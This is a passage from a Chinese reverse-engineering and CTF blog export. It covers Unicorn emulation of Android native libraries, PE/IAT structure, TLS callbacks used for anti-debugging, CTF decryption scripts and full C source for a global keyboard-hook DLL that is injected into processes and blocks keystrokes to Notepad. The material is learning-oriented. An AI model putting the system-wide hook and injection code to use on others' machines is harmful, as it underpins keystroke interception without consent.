这里有出现负地址，负地址就是函数执行到libc.so文件中，这里由于没有初始化的缘故，可能libc中部分函数执行失败，这里我们手动hook，&#x3D;&#x3D;本质是hook got表地址&#x3D;&#x3D; 这里我们定位到ida中出错的地址 发现是这个库函数有问题。那就hook它 hook添加hook 此处必须在导入so文件之前就hook，在导入so文件之前hook才生效，导入之后没法hook 123456789# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器@native_methoddef __aeabi_memclr(mu,addr,size): print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size)) # 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容# 在导入so文件之前hook才生效，导入之后没法hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1) 其他函数以此类推 关于sprintf函数，第一个参数，是a2，就是buffer地址 全部函数hook后： 这里输出是空因为，我们hook相关函数还未在unicorn中实现，这里我们做个实现即可 123456789101112131415161718@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format)) 这里说明一下bytes()函数放入int型会输出什么： 最终结果： 全部代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from unicorn import *import loggingimport sysfrom androidemu.java.helpers.native_method import native_methodfrom UnicornTraceDebugger import udbgfrom androidemu.emulator import Emulatorfrom androidemu.utils import memory_helpers# 配置logginglogging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# 用于打印调试信息logger = logging.getLogger(__name__)# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format))# 创建模拟器emulator = Emulator()# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容# 在导入so文件之前hook才生效，导入之后没法hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1)emulator.modules.add_symbol_hook(&#x27;__aeabi_memcpy&#x27;, emulator.hooker.write_function(__aeabi_memcpy) + 1)emulator.modules.add_symbol_hook(&#x27;sprintf&#x27;, emulator.hooker.write_function(sprintf) + 1)# 加载相关so文件# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，# 这可能会涉及更多库的调用emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning2","slug":"unicorn-learning2","date":"2022-12-30T01:40:33.000Z","updated":"2022-12-30T07:24:54.480Z","comments":true,"path":"2022/12/30/unicorn-learning2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/30/unicorn-learning2/","excerpt":"unicorn start 用unicorn调用so文件中的某个函数，观察函数的输入与输出","text":"unicorn start 用unicorn调用so文件中的某个函数，观察函数的输入与输出 目标hook so文件中的sign1函数的输出与输入 这个函数内部调用了两个函数，tea_encrypt和sprintf，这两个函数中tea_encrypt函数只需要修复got表项即可调用tea_encrypt，但是sprintf函数不行 这里我们开始实验 创建虚拟机由于这里的指令都是两个字节为一条指令 所以这里为thumb指令集 1234567891011def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # mu就是arm虚拟机 建立内存映射+写入数据由于这是要模拟执行一段函数，所以要建立镜像区，栈区，数据段区的内存 这里各个区的大小存粹靠估算 12345678910111213141516171819image = open(&#x27;./libnative-lib.so&#x27;,&#x27;rb&#x27;).read()# 镜像内存image_base = 0x0mu.mem_map(image_base, 0x10000*8) # 这里大小自己估算mu.mem_write(image_base,image)# 栈内存stack_base = 0xa0000stack_size = 0x10000 * 3mu.mem_map(stack_base, stack_size) # 这里大小自己估算stack_top = stack_base + stack_size - 0x4mu.reg_write(UC_ARM_REG_SP,stack_top)# 数据段内存a1 = b&#x27;123&#x27;data_base = 0xf0000data_size = 0x10000 * 3mu.mem_map(data_base, data_size) # 这里大小自己估算mu.mem_write(data_base,a1) 这里栈区的sp指针应小于栈大小的0x4，防止栈溢出，这里我们将‘123’字符串写入数据段，来作为函数的参数使用 添加hook函数主要用于程序报错时可以及时追踪到哪里有问题 123456789def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) mu.hook_add(UC_HOOK_CODE,hook_code,0)mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0) 开始执行12345678910#开始执行虚拟机start_addr = 0x9B68end_addr = 0x9C2Ctry: mu.emu_start(start_addr, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e) 结果只运行到第一条指令： 这里将开始地址+1，然后执行： 然后这里就遇到了函数地址外的地址，很奇怪！！！，这里找到0x91ac,也就是最后一次正常的地方，发现来到了plt表，点击后又来到got表，这里的got表其实是ida已经自动补全了，unicorn需要自己手动补全 补全后： 执行代码： 123456789101112#开始执行虚拟机start_addr = 0x9B68end_addr = 0x9C2Ctry: # 添加got表 mu.mem_write(0x1EDB0,b&#x27;\\xD9\\x98\\x00\\x00&#x27;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e) 最后代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from unicorn import *from unicorn.arm_const import *import binasciidef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # mu就是arm虚拟机image = open(&#x27;./libnative-lib.so&#x27;,&#x27;rb&#x27;).read()# 镜像内存image_base = 0x0mu.mem_map(image_base, 0x10000*8) # 这里大小自己估算mu.mem_write(image_base,image)# 栈内存stack_base = 0xa0000stack_size = 0x10000 * 3mu.mem_map(stack_base, stack_size) # 这里大小自己估算stack_top = stack_base + stack_size - 0x4mu.reg_write(UC_ARM_REG_SP,stack_top)# 数据段内存a1 = b&#x27;123&#x27;data_base = 0xf0000data_size = 0x10000 * 3mu.mem_map(data_base, data_size) # 这里大小自己估算mu.mem_write(data_base,a1)#函数参数通过数据段传递 寄存器是R0mu.reg_write(UC_ARM_REG_R0,data_base)# 添加hook函数# mu.hook_add(UC_HOOK_CODE,hook_code,0)# mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0)#开始执行虚拟机start_addr = 0x9B68end_addr = 0x9C2Ctry: # 添加got表 mu.mem_write(0x1EDB0,b&#x27;\\xD9\\x98\\x00\\x00&#x27;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning1","slug":"unicorn1","date":"2022-12-29T06:32:54.000Z","updated":"2022-12-29T07:54:07.945Z","comments":true,"path":"2022/12/29/unicorn1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/29/unicorn1/","excerpt":"unicorn start! 效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了","text":"unicorn start! 效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了 Unicorn 入门学习unicorn 是用于执行多种cpu框架的虚拟架构系统 下面进行模仿arm架构，执行arm指令首先在python中导入unicorn 1from unicorn import * 如何根据自己要执行指令对应哪个cpu架构，来导入相应的处理器相关的常量 123456from unicorn.arm_const import *from unicorn.arm64_const import *from unicorn.m68k_const import *from unicorn.mips_const import *from unicorn.sparc_const import *from unicorn.x86_const import * 寄存器常量命名规则：UC_ + 指令集 + REG + 大写寄存器名UC_ARMREG + 大写寄存器名 （UC_ARM_REG_R0）UC_X86REG + 大写寄存器名 （UC_X86_REG_EAX） 这里我们选择unicorn.arm_const 创建arm虚拟机（UC）Uc 是unicorn的主类，Uc对象则代表了一个独立的虚拟机实例，它有独立的寄存器和内存等资源，不同Uc对象之间的数据是独立的。Uc的构造函数有两个参数 arch 和 mode，用来指定模拟执行的指令集和对应的位数或模式。arch常量参数一般以 UCARCH 开头，MODE常量以UCMODE 开头。 123456789101112# Test ARMdef test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_ARM) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # mu就是arm虚拟机 映射内存想用Unicorn模拟执行代码，是不能将代码字节流直接以参数形式传递给Unicorn，而是将要执行的代码写入到Unicorn 的虚拟内存中。Uc 虚拟机实例初始内存是没有任何映射的，在读写内存之前使用uc_mem_map函数映射一段内存 这里开始地址和地址大小都要和0x1000&#x3D;&#x3D;对齐&#x3D;&#x3D; 否则就是我这种错误： 12ADDRESS = 0x10000mu.mem_map(ADDRESS, 0x1000) # 这里大小自己估算 写入代码将想要执行的代码写进我们创建的内存中 mem_write的第二个参数必须是byte字节数组，只支持python的byte数组，不能是String或者bytearray。 1234ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot;# mov r0, #0x37;# sub r1, r2, r3mu.mem_write(ADDRESS, ARM_CODE) 给寄存器初始赋值 1234mu.reg_write(UC_ARM_REG_R0, 0x0)mu.reg_write(UC_ARM_REG_R2, 0x4)mu.reg_write(UC_ARM_REG_R3, 0x1)# 这里r1的结果预估是0x3 添加指令级的Hookhook类型： 指令执行类： UC_HOOK_INTR UC_HOOK_INSN UC_HOOK_CODE UC_HOOK_BLOCK 内存访问类： UC_HOOK_MEM_READ UC_HOOK_MEM_WRITE UC_HOOK_MEM_FETCH UC_HOOK_MEM_READ_AFTER UC_HOOK_MEM_PROT UC_HOOK_MEM_FETCH_INVALID UC_HOOK_MEM_INVALID UC_HOOK_MEM_VALID 异常处理类： UC_HOOK_MEM_READ_UNMAPPED UC_HOOK_MEM_WRITE_UNMAPPED UC_HOOK_MEM_FETCH_UNMAPPED 123def hook_add(self, htype, callback, user_data=None, begin=1, end=0, arg1=0): passmu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=0x1000) 以上是添加hook的操作 在begin…end范围内的每一条指令被执行前都会调用callback。 hook函数编写： 123# callback for tracing instructionsdef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) 执行虚拟机emu_start 可以通过timeout参数设置最长执行时长，防止线程死在虚拟机里面。emu_start 执行完成后，可以通过读取内存或寄存器的方式来获取执行结果。 123def emu_start(self, begin, until, timeout=0, count=0): passmu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) 执行成功，hook函数一共被调用两次（指令有两条） 获取寄存器结果1234r0 = mu.reg_read(UC_ARM_REG_R0)r1 = mu.reg_read(UC_ARM_REG_R1)print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0)print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) 和推理的结果相同！！！！ 个人测试全过程： 完整代码： 1234567891011121314151617181920212223242526272829303132333435from unicorn import *from unicorn.arm_const import *ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot;# mov r0, #0x37;# sub r1, r2, r3# Test ARM # callback for tracing instructionsdef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # map 2MB memory for this emulation ADDRESS = 0x10000 mu.mem_map(ADDRESS, 2 * 0x10000) mu.mem_write(ADDRESS, ARM_CODE) mu.reg_write(UC_ARM_REG_R0, 0x1234) mu.reg_write(UC_ARM_REG_R2, 0x6789) mu.reg_write(UC_ARM_REG_R3, 0x3333) mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS) # emulate machine code in infinite time mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) r0 = mu.reg_read(UC_ARM_REG_R0) r1 = mu.reg_read(UC_ARM_REG_R1) print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0) print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) except UcError as e: print(&quot;ERROR: %s&quot; % e) 文章引用Pandaos大佬的文章：[原创] Unicorn 在 Android 的应用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"re_base3","slug":"re-base3","date":"2022-12-22T11:33:01.000Z","updated":"2022-12-22T13:20:03.197Z","comments":true,"path":"2022/12/22/re-base3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/22/re-base3/","excerpt":"PE and IAT hook","text":"PE and IAT hook PE由于了解IAT,需要了解一点PE,这里把PE也给写了吧 PE文件种类： OBJ文件不能执行，dll和sys文件需要调试器执行或者服务和程序加载执行 DOS签名和PE签名 PE文件大体分为：1.PE头、2.PE体 1.PE头 DOS签名 DOS存根 NT头 一系列节区头 .data(数据) .text(代码) .rsrc(资源) 2.PE体：一系列节区 名词介绍： ​ VA:virtual address 绝对虚拟内存地址 ​ RVA:相对虚拟内存地址 ​ VA &#x3D; RVA + imageBase DOS头结构体：唯一有用的就是e_magic和e_lfanew 其中e_magic就是Dos签名，e_lfanew就是NT头的偏移 DOS存根Dos存根是兼容dos系统的一种产物，可有可无，内容可用xp内置debug查看 内容是一段汇编代码，在dos系统中执行 NT头NT头结构体 签名不作介绍，文件头结构体： Machine代表cpu类别 SizeOfOptionalHeader是表示可选头的大小 Characteristics表示文件是否是dll，是否可执行 NT可选头结构体： NT可选头非常重要，它记录了很多重要的数据 ImageBase，是映像基址，映像指的是PE文件加载到内存的一种形态（我觉得更像是一种叫法），映像基址定义了文件加载进内存的基础地址 SectionAlignment, 节区对齐是文件在内存中的最小单位，文件在内存的大小应该是这个值的整数倍 FileAlignment, 文件对齐是文件在磁盘中的最小单位，文件在磁盘的大小应该是这个值的整数倍 Subsystem,子系统用来区分文件是sys驱动文件还是exe可执行文件 NumberOfRvaAndSizes , 记录DataDirectory数组的个数 DataDirectory： 节区头结构体： 这里的VirtualAddress是用RVA表示的 RAV to RAWRAW就是文件中节区的偏移（非内存） IAT导入地址表映像导入描述结构体： 文件导入多少个库文件，就有多少个 image_import_descriptor结构体 &#x3D;&#x3D;该结构体的地址保存在image_optional_header32.DataDirectory[1].VirtualAddress中&#x3D;&#x3D; INT结构体保存着Image_import_by_name的指针 结构图： PE装载器将导入函数加载到IAT的顺序： EAT不想写了，和IAT差不多，一个导入一个导出 它的查找数据先是image_optional_header32.DataDirectory[0].VirtualAddress找到这个结构体，然后根据要找的函数名去AddressOfNames数组里面拿到下标，然后用下标再去Oridinal数组找，找到下标又去AddressOfFunction那里找函数地址 没有函数名直接用Ordinal查找，Ordinal数组存在的意义是我忘了。。反正就这样 IAT hook","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"re_base2","slug":"re-base2","date":"2022-12-21T13:56:29.000Z","updated":"2022-12-22T03:22:59.840Z","comments":true,"path":"2022/12/21/re-base2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/21/re-base2/","excerpt":"TLS and keyboard hooking","text":"TLS and keyboard hooking TLS回调TLS(Thread Local Storage) 线程本地存储，主要用于提供本地线程访问局部数据的句柄。 下面来一段官方解释： 使用线程本地存储 （TLS），可以为进程可以使用全局索引访问的每个线程提供唯一数据。一个线程分配索引，其他线程可以使用它来检索与索引关联的唯一数据 原理图： &#x3D;&#x3D;TLS主要用于程序的反调试检测&#x3D;&#x3D; 它在运行EP（entrypoint 程序入口代码）代码前执行 TLS结构体： 可以看到TLS结构体中保存着回调函数的地址 可以打开CFF explore软件直接查看存放TLS回调函数数组的地址 打开od查看它的地址为401000 汇编直接定位过去就出来了 TLS回调函数是在进程或线程创建或终止时调用，如果某个进程存在一个线程，那从程序的创建到销毁需要4次调用回调函数 TLS回调函数定义： 注册TLS程序示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123; HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123; print_console(&quot;ThreadProc() start\\n&quot;); print_console(&quot;ThreadProc() end\\n&quot;); return 0;&#125;int main(void)&#123; HANDLE hThread = NULL; print_console(&quot;main() start\\n&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, 60*1000); CloseHandle(hThread); print_console(&quot;main() end\\n&quot;); return 0;&#125; 调试TLS回调函数直接在运行前设置调试选项 添加TLS这里不做阐述 keyboard hooking消息钩取工作原理 使用SetWindowsHookEx()可以实现消息钩子，钩子函数需要存在于dll文件中，由操作系统调用回调函数 API定义： 在某进程拥有消息，操作系统就会将dll注入进程序中，实现消息钩取 只需要一个程序加载安装钩子所在的dll程序，然后SetWindowsHookEx()注册钩子，操作系统就会检测每一个程序的行为，一旦发生键盘输入，就将dll文件注入。 加载dll注册hook实例： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define DEF_DLL_NAME &quot;KeyHook.dll&quot;#define DEF_HOOKSTART &quot;HookStart&quot;#define DEF_HOOKSTOP &quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123; HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; // KeyHook.dll 肺爹 hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; // export 窃荐 林家 掘扁 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // 饶欧 矫累 HookStart(); // 荤侩磊啊 &#x27;q&#x27; 甫 涝仿且 锭鳖瘤 措扁 printf(&quot;press &#x27;q&#x27; to quit!\\n&quot;); while( _getch() != &#x27;q&#x27; ) ; // 饶欧 辆丰 HookStop(); // KeyHook.dll 攫肺爹 FreeLibrary(hDll);&#125; dll代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME &quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123; switch( dwReason ) &#123; case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; char szPath[MAX_PATH] = &#123;0,&#125;; char *p = NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#x27;\\\\&#x27;); // 泅犁 橇肺技胶 捞抚阑 厚背秦辑 父距 notepad.exe 扼搁 0 酒囱 蔼阑 府畔窃 // =&gt; 0 酒囱 蔼阑 府畔窍搁 皋矫瘤绰 促澜栏肺 傈崔登瘤 臼澜 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; // 老馆利牢 版快俊绰 CallNextHookEx() 甫 龋免窍咯 // 览侩橇肺弊伐 (趣篮 促澜 扰) 栏肺 皋矫瘤甫 傈崔窃 return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif __declspec(dllexport) void HookStart() &#123; g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); &#125; __declspec(dllexport) void HookStop() &#123; if( g_hHook ) &#123; UnhookWindowsHookEx(g_hHook); g_hHook = NULL; &#125; &#125;#ifdef __cplusplus&#125;#endif 调试hook用字符串搜索直接定位到main函数 上面得到hookStart地址，然后call，F7直接步入就能进入hookstart函数 这里就是dll中注册键盘hook 直接根据注册时得到的地址进行跳转就能得到hook函数 也可以打开notepad，进行附加attach，先摁F9，让hook注册成功 然后在新加一个模块处停止，option设置 附加后在键盘输入字母，od会立马断住。","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"syc_level7","slug":"syc-level7","date":"2022-12-20T03:30:36.000Z","updated":"2022-12-20T04:11:42.019Z","comments":true,"path":"2022/12/20/syc-level7/","link":"","permalink":"https://pa1r0t.github.io/2022/12/20/syc-level7/","excerpt":"syc_level7 这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作","text":"syc_level7 这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作 这里有四个throw块，要找到对应catch代码，然后jmp过去就能看见源码，三叶草那边的解答是手撸汇编代码，说实话这种分析太慢，而且容易出错，还不如让ida来帮我们分析 转到卡片形式汇编代码，有这种标志的就是catch代码 然后将所有的catch块打上断点 然后在throw代码之前也都打上断点 然后，运行程序找到，各个throw对应的catch块 修改throw代码为jmp 对应catch地址，直接看到源码 这里随机数，大循环32次每一次要重置srand，小循环四次，所以只需要输出4个随机数即可 这里用c语言中的srand代码生成随机数，值得注意的是，&#x3D;&#x3D;我在windows上用c语言跑，跑出来的随机数根本不对。要在linux上面跑才行&#x3D;&#x3D; 这里根据随机数，标上代码块的执行顺序 最后python伪代码： 12345678910111213enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]delta = 0x9E3779B9for i in range(32): v11 += delta v12 += delta v7 += ((v8 &gt;&gt; 5) + 6) ^ (v8 + v11) ^ (16 * v8 + 8) ^ (i + v11) v9 += ((v10 &gt;&gt; 5) + 6) ^ (v10 + v12) ^ (16 * v10 + 8) ^ (i + v12) v8 += ((v7 &gt;&gt; 5) + 7) ^ (v7 + v11) ^ (16 * v7 + 9) ^ (i + v11) v10 += ((v9 &gt;&gt; 5) + 7) ^ (v9 + v12) ^ (16 * v9 + 9) ^ (i + v12)v19 = v7 ^ HIBYTE(delta)v20 = v8 ^ BYTE2(delta)v21 = v9 ^ BYTE1(delta)v22 = v10 ^ (unsigned __int8)delta 然后根据这个代码写出解密脚本： 1234567891011121314151617181920212223# lesson7from Crypto.Util.number import *enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]delta = 0x9E3779B9s = (delta*32)&amp;0xffffffffv7 = enc[0]^0x9ev8 = enc[1]^0x37v9 = enc[2]^0x79v10 = enc[3]^0xb9for i in range(31,-1,-1): v10 -= ((v9 &gt;&gt; 5) + 7) ^ (v9 + s) ^ (16 * v9 + 9) ^ (i + s) v10 = v10&amp;0xffffffff v8 -= ((v7 &gt;&gt; 5) + 7) ^ (v7 + s) ^ (16 * v7 + 9) ^ (i + s) v8 = v8&amp;0xffffffff v9 -= ((v10 &gt;&gt; 5) + 6) ^ (v10 + s) ^ (16 * v10 + 8) ^ (i + s) v9 = v9&amp;0xffffffff v7 -= ((v8 &gt;&gt; 5) + 6) ^ (v8 + s) ^ (16 * v8 + 8) ^ (i + s) v7 = v7&amp;0xffffffff s = (s-delta)&amp;0xffffffffenc = [v7,v8,v9,v10]flag = int(&#x27;&#x27;.join(map(lambda x: hex(x)[2:],enc)),16)long_to_bytes(flag)#SYC&#123;ediGegTEaEi&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"syc_level5","slug":"syc-level5","date":"2022-12-19T13:02:09.000Z","updated":"2022-12-19T13:11:09.681Z","comments":true,"path":"2022/12/19/syc-level5/","link":"","permalink":"https://pa1r0t.github.io/2022/12/19/syc-level5/","excerpt":"emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧","text":"emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧 魔改AES 这里做21次操作。但是无列混淆 第一次做这种魔改aes，逆着就是先行移位，原先怎么移动，就逆回去 然后再字节替换，也可以逆 然后再轮密钥加，这个要从后往前，不然会影响字节替换，字节替换是必须要有顺序的 最后就是每一个密文块的初始异或，该题除了第一块，其他都是拿密文块作为密匙 结果： 12345678910111213141516171819202122232425262728293031323334353637# lesson5def row_re(i): # 第二行 v1 = a1[13+i*16] a1[13+i*16] = a1[9+i*16] a1[9+i*16] = a1[5+i*16] a1[5+i*16] = a1[1+i*16] a1[1+i*16] = v1 # 第三行 不变 v2 = a1[2+i*16] a1[2+i*16] = a1[10+i*16] a1[10+i*16] = v2 v3 = a1[6+i*16] a1[6+i*16] = a1[14+i*16] a1[14+i*16] = v3 # 第四行 v4 = a1[15+i*16] a1[15+i*16] = a1[3+i*16] a1[3+i*16] = a1[7+i*16] a1[7+i*16] = a1[11+i*16] a1[11+i*16] = v4 a1 = [0xF8, 0x88, 0x9D, 0x31, 0xC7, 0x24, 0xD5, 0xF9, 0x45, 0x28, 0x9B, 0x7D, 0x42, 0x66, 0x65, 0x29, 0x2E, 0xC3, 0xC3, 0x5F, 0x1E, 0x1C, 0x43, 0xE9, 0x1E, 0xE1, 0xB9, 0xBD, 0x85, 0x5B, 0x7A, 0x39, 0xDE, 0xF6, 0xA7, 0xB8, 0xF5, 0xD2, 0xF9, 0xFE, 0xD9, 0xA0, 0x13, 0xF3, 